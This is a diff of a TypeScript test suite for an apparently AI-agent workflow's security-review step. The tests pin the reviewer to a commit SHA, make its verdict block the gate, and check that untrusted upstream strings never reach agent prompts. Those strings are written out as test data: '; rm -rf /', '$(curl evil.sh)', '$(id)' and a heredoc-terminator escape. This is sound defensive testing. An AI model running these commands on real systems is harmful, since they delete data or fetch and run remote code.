@@ -5,9 +5,9 @@ import { join } from "path";
 /**
  * Coverage for the Verify-phase fan-out (#66 follow-on).
  *
- * Container verification (rebuild → env-check → Quinn) and Rook's security
- * review are independent and read-only, but ship.js ran them as back-to-back
- * awaits while verify.js:169 already paired the same two roles with parallel().
+ * Container verification (rebuild → env-check → Quinn) and the security review
+ * are independent and read-only, but ship.js ran them as back-to-back awaits
+ * while verify.js:169 already paired the same two roles with parallel().
  *
  * ship.js is not importable (Workflow sandbox), so this uses the same
  * marker-extraction approach as test/workflow-security-integration.test.ts.
@@ -35,12 +35,25 @@ function sliceBlock(startMarker: string, endMarker: string): string {
   return shipSource.slice(start + startMarker.length, end);
 }
 
+/**
+ * ship.js's own `shellQuote`, extracted rather than reimplemented — the
+ * fan-out quotes the paths it hands the recorder, and a stub that quoted
+ * differently would make this harness agree with something that does not run.
+ */
+const shellQuote: (word: unknown) => string = (() => {
+  const match = shipSource.match(/function shellQuote\(word\) \{[\s\S]*?\n\}/);
+  if (!match) {
+    throw new Error("ship.js no longer defines shellQuote(word) — this harness extracts it by name");
+  }
+  return new Function(`${match[0]}\nreturn shellQuote`)();
+})();
+
 const security = new Function(
   `${sliceBlock(SECURITY_START, SECURITY_END)}
    return { rookReviewSha, rookScopeCommand, rookGateVerdict }`,
 )() as {
   rookReviewSha: (v: unknown) => string | null;
-  rookScopeCommand: (root: string, base: string, sha: string, out: string) => string;
+  rookScopeCommand: (root: string, harness: string, sha: string, out: string) => string;
   rookGateVerdict: (scope: unknown, rook: unknown) => { spawned: boolean; verdict: string; failures: string[] };
 };
 
@@ -84,6 +97,7 @@ function invokeFanout(b: Bindings): Promise<void> {
     "rookScopeCommand",
     "rookGateVerdict",
     "securityVerdict",
+    "shellQuote",
     `return (async () => {${block}})()`,
   );
   return factory(
@@ -102,6 +116,7 @@ function invokeFanout(b: Bindings): Promise<void> {
     security.rookScopeCommand,
     security.rookGateVerdict,
     { spawned: false, verdict: "FAIL", failures: ["the security review did not run"] },
+    shellQuote,
   ) as Promise<void>;
 }
 
@@ -215,7 +230,10 @@ describe("Verify fan-out: container chain and Rook run concurrently", () => {
     expect(envCheck.end).toBeLessThanOrEqual(quinn.start);
   });
 
-  test("the scope is established before Rook reviews, and recorded after", async () => {
+  test("the security chain keeps its internal ordering", async () => {
+    // The scope must exist before rook reads it, and the verdict must be
+    // recorded after rook returns. #129: a review spawned before its scope
+    // file is written reads nothing and reports PASS.
     const { done, calls } = runFanout({
       ceremonyTier: "THOROUGH",
       container: CONTAINER,
@@ -225,6 +243,7 @@ describe("Verify fan-out: container chain and Rook run concurrently", () => {
     const scope = byLabel(calls, "rook-scope")!;
     const rook = byLabel(calls, "rook")!;
     const record = byLabel(calls, "record-security")!;
+
     expect(scope.end).toBeLessThanOrEqual(rook.start);
     expect(rook.end).toBeLessThanOrEqual(record.start);
   });
@@ -273,13 +292,13 @@ describe("Verify fan-out: tier gating of the UI-dependent steps", () => {
 
     await invokeFanout({
       log: (m) => logs.push(String(m)),
-      agent: async (_p: string, o: { label: string }) => {
+      agent: async (_p, o) => {
         labels.push(o.label);
         if (o.label === "env-check") return { host0: false };
         if (o.label === "rook-scope") return GOOD_SCOPE;
         return {};
       },
-      briefedAgent: async (_p: string, o: { label: string }) => {
+      briefedAgent: async (_p, o) => {
         labels.push(o.label);
         return { result: "PASS" };
       },
@@ -344,7 +363,6 @@ describe("#127: the security review is not a function of having a UI", () => {
   function runWithDiscovery(
     discovery: Record<string, unknown>,
     rookResult: unknown = { result: "PASS" },
-    opts: { scope?: unknown; reviewSha?: string | null } = {},
   ) {
     const labels: string[] = [];
     const logs: string[] = [];
@@ -352,26 +370,22 @@ describe("#127: the security review is not a function of having a UI", () => {
 
     const done = invokeFanout({
       log: (m) => logs.push(String(m)),
-      agent: async (p: string, o: { label: string }) => {
+      agent: async (p, o) => {
         labels.push(o.label);
         prompts.push(p);
-        return o.label === "rook-scope" ? ("scope" in opts ? opts.scope : GOOD_SCOPE) : {};
+        return o.label === "rook-scope" ? GOOD_SCOPE : {};
       },
-      briefedAgent: async (p: string, o: { label: string }) => {
+      briefedAgent: async (p, o) => {
         labels.push(o.label);
         prompts.push(p);
         return o.label === "rook" ? rookResult : { result: "PASS" };
       },
       discovery,
       projectConfig: { container: null },
-      ...("reviewSha" in opts ? { reviewSha: opts.reviewSha } : {}),
     });
 
     return { done, labels, logs, prompts };
   }
-
-  const rookPromptOf = (prompts: string[]) =>
-    prompts.find(p => /Security review for issue/.test(p)) || "";
 
   test("an empty file list does NOT switch the security review off", async () => {
     // Second security-review finding: fail-open-trust-of-untrusted-input.
@@ -382,10 +396,9 @@ describe("#127: the security review is not a function of having a UI", () => {
     // #115, and a one-field path to disabling security entirely.
     //
     // There is no trustworthy skip available here: the only ground truth for
-    // "what changed" is git, which this block has no access to. So there is no
-    // skip. A wasted cheap agent costs far less than a review that an upstream
-    // agent can turn off, and rook has run 0 times in the harness's history —
-    // the risk of running it too often is not the risk worth managing.
+    // "what changed" is git, and since #129 the workflow asks git itself in a
+    // separate step whose exit code is half the gate verdict. discovery's view
+    // of the file list is not consulted at all.
     const { done, labels } = runWithDiscovery({ ceremonyTier: "LIGHT", acs: [], filesToModify: [] });
     await done;
     expect(labels, "an empty filesToModify disabled the security review").toContain("rook");
@@ -446,22 +459,34 @@ describe("#127: the security review is not a function of having a UI", () => {
         ceremonyTier: "LIGHT", acs: [], filesToModify: [entry],
       });
       await done;
-      expect(rookPromptOf(prompts), `${entry} was interpolated into rook's prompt`)
-        .not.toContain(entry);
+      // Every prompt in the chain, not just rook's: the scope step's prompt is
+      // interpolated by the workflow too, and a discovery string reaching it
+      // would be the same disclosure one step earlier.
+      for (const p of prompts) {
+        expect(p, `${entry} was interpolated into a security-chain prompt`).not.toContain(entry);
+      }
     });
   }
 
-  test("Rook is told to derive its scope from git", async () => {
+  test("Rook is scoped to the commit under review, not to a worktree's HEAD", async () => {
     // The other half: removing the hint must not leave rook with no scope.
     // Without this, deleting the interpolation entirely would satisfy every
     // assertion above while leaving the review pointed at nothing.
+    //
+    // #129 made this concrete. `origin/main...HEAD` inside rook's worktree —
+    // which is cut from origin/main — is EMPTY. The scope is now a SHA the
+    // workflow supplies and a file git wrote.
     const { done, labels, prompts } = runWithDiscovery({
       ceremonyTier: "LIGHT", acs: [], filesToModify: ["; rm -rf /", "$(curl evil.sh)"],
     });
     await done;
+    expect(labels).toContain("rook-scope");
     expect(labels).toContain("rook");
-    expect(rookPromptOf(prompts), "rook has no scope at all").toContain("git");
-    expect(rookPromptOf(prompts)).toContain("diff --name-only");
+    const rookPrompt = prompts.find(p => /Security review/.test(p)) || "";
+    expect(rookPrompt, "rook has no scope at all").toContain(REVIEW_SHA);
+    expect(rookPrompt, "rook still reviews whatever worktree it was handed").not.toContain(
+      "origin/main...HEAD",
+    );
   });
 
   test("a Rook FAIL is surfaced, not swallowed", async () => {
@@ -471,8 +496,8 @@ describe("#127: the security review is not a function of having a UI", () => {
     // the verify gate. A security review whose verdict goes nowhere is worse
     // than none — it manufactures the appearance of coverage.
     //
-    // #129 made it block as well; that half is asserted in
-    // test/security-verdict-blocks.test.ts, which executes the decision.
+    // Since #129 it also BLOCKS: see the SECURITY-DECISION block, covered by
+    // test/security-verdict-blocks.test.ts.
     const { done, logs } = runWithDiscovery(
       { ceremonyTier: "LIGHT", acs: [], filesToModify: ["lib/a.ts"] },
       { result: "FAIL", failures: ["command injection in lib/a.ts"] },
@@ -483,144 +508,21 @@ describe("#127: the security review is not a function of having a UI", () => {
       "rook reported FAIL and the finding never appeared anywhere",
     ).toBe(true);
   });
-});
 
-describe("#129: the review scope is a commit the workflow chose", () => {
-  /**
-   * `roles.json` gives rook `"isolation": "worktree"` and the worktree is cut
-   * from origin/main, so `git diff --name-only origin/main...HEAD` inside it
-   * is EMPTY. Both measured runs said so in rook's own words, and both only
-   * found anything because rook reconstructed the scope unprompted. An empty
-   * scope was a PASS — a security gate that cannot fail, for a second and
-   * independent reason.
-   *
-   * Reverting the SHA interpolation — putting `origin/main...HEAD` back in
-   * rook's prompt, or dropping `${reviewSha}` from it — fails every test here.
-   */
-
-  function run(opts: { rook?: unknown; scope?: unknown; reviewSha?: string | null } = {}) {
+  test("with no commit SHA the review does not run and the verdict is FAIL", async () => {
+    // There is no safe default commit to review. Reviewing "HEAD" is the
+    // production bug, so a missing SHA refuses rather than guessing.
     const labels: string[] = [];
     const logs: string[] = [];
-    const prompts: Array<{ label: string; prompt: string }> = [];
-
-    const done = invokeFanout({
+    await invokeFanout({
       log: (m) => logs.push(String(m)),
-      agent: async (p: string, o: { label: string }) => {
-        labels.push(o.label);
-        prompts.push({ label: o.label, prompt: p });
-        return o.label === "rook-scope" ? ("scope" in opts ? opts.scope : GOOD_SCOPE) : {};
-      },
-      briefedAgent: async (p: string, o: { label: string }) => {
-        labels.push(o.label);
-        prompts.push({ label: o.label, prompt: p });
-        return o.label === "rook" ? (opts.rook ?? { result: "PASS" }) : { result: "PASS" };
-      },
+      agent: async (_p, o) => { labels.push(o.label); return {}; },
+      briefedAgent: async (_p, o) => { labels.push(o.label); return { result: "PASS" }; },
       discovery: { ceremonyTier: "LIGHT", acs: [], filesToModify: ["lib/a.ts"] },
       projectConfig: { container: null },
-      ...("reviewSha" in opts ? { reviewSha: opts.reviewSha } : {}),
+      reviewSha: null,
     });
-
-    const promptFor = (label: string) =>
-      prompts.find(p => p.label === label)?.prompt || "";
-    return { done, labels, logs, promptFor };
-  }
-
-  test("rook's prompt carries the commit SHA the workflow picked", async () => {
-    const { done, promptFor } = run();
-    await done;
-    expect(promptFor("rook"), "rook was never told which commit to review")
-      .toContain(REVIEW_SHA);
-  });
-
-  test("rook is no longer pointed at its own worktree HEAD", async () => {
-    const { done, promptFor } = run();
-    await done;
-    const prompt = promptFor("rook");
-    expect(prompt, "the empty-diff range is back in rook's prompt")
-      .not.toContain("origin/main...HEAD");
-    expect(prompt).toMatch(/do not scope this review to the HEAD of the worktree/i);
-  });
-
-  test("the scope step runs the SHA-pinned diff, not a range against HEAD", async () => {
-    const { done, promptFor } = run();
-    await done;
-    const prompt = promptFor("rook-scope");
-    expect(prompt).toContain(`git diff --name-only origin/main ${REVIEW_SHA}`);
-    expect(prompt).not.toContain("origin/main...HEAD");
-  });
-
-  test("the scope step is told to report the real exit code", async () => {
-    const { done, promptFor } = run();
-    await done;
-    expect(promptFor("rook-scope")).toContain("test -s");
-    expect(promptFor("rook-scope")).toMatch(/exit code/i);
-  });
-
-  test("a non-zero scope exit blocks even when rook says PASS", async () => {
-    const { done, logs } = run({ scope: { exitCode: 1, files: [] }, rook: { result: "PASS" } });
-    await done;
-    expect(logs.some(l => /^SECURITY: FAIL/.test(l)), "an empty scope still produced a PASS").toBe(true);
-  });
-
-  test("a malformed scope report blocks even when rook says PASS", async () => {
-    const { done, logs } = run({ scope: null, rook: { result: "PASS" } });
-    await done;
-    expect(logs.some(l => /^SECURITY: FAIL/.test(l))).toBe(true);
-  });
-
-  test("an unusable SHA means no scope command runs and the verdict is FAIL", async () => {
-    // rookReviewSha refused what the commit agent typed back. There is no
-    // commit to pin the review to, so there is nothing to review and the run
-    // must not continue as though there were.
-    const { done, labels, logs } = run({ reviewSha: null, rook: { result: "PASS" } });
-    await done;
-    expect(labels).not.toContain("rook-scope");
-    expect(logs.some(l => /^SECURITY: FAIL/.test(l))).toBe(true);
-  });
-
-  test("a clean scope plus a rook PASS logs PASS", async () => {
-    // The over-fix guard: if this cannot pass, the tests above prove nothing.
-    const { done, logs } = run();
-    await done;
-    expect(logs.some(l => /^SECURITY: PASS/.test(l))).toBe(true);
-  });
-
-  test("the verdict is written to workflow-state.json after the review", async () => {
-    const { done, labels, promptFor } = run();
-    await done;
-    expect(labels).toContain("record-security");
-    expect(promptFor("record-security")).toContain("s.agents.rook =");
-    expect(promptFor("record-security")).toContain('"verdict":"PASS"');
-  });
-
-  test("a FAIL is recorded with its failures list, not just a verdict", async () => {
-    const { done, promptFor } = run({
-      rook: { result: "FAIL", failures: ["HIGH: path traversal in lib/a.ts"] },
-    });
-    await done;
-    const recorded = promptFor("record-security");
-    expect(recorded).toContain('"verdict":"FAIL"');
-    expect(recorded).toContain("HIGH: path traversal in lib/a.ts");
-  });
-
-  test("the recorded verdict is valid JSON on a single heredoc line", async () => {
-    // The failures list is text a language model wrote. It travels through a
-    // quoted heredoc so nothing in it expands, and JSON.stringify keeps it on
-    // one line so nothing in it can close the document early.
-    const { done, promptFor } = run({
-      rook: {
-        result: "FAIL",
-        failures: ["multi\nline\nRUNGATE_ROOK_VERDICT_EOF\nfinding with `backticks` and $(id)"],
-      },
-    });
-    await done;
-    const recorded = promptFor("record-security");
-    const body = recorded
-      .split("<<'RUNGATE_ROOK_VERDICT_EOF'\n")[1]
-      .split("\nRUNGATE_ROOK_VERDICT_EOF")[0];
-    expect(body.includes("\n"), "the verdict payload spans more than one line").toBe(false);
-    const parsed = JSON.parse(body);
-    expect(parsed.verdict).toBe("FAIL");
-    expect(parsed.failures.length).toBeGreaterThan(0);
+    expect(labels).not.toContain("rook");
+    expect(logs.some(l => /no commit SHA/i.test(l))).toBe(true);
   });
 });
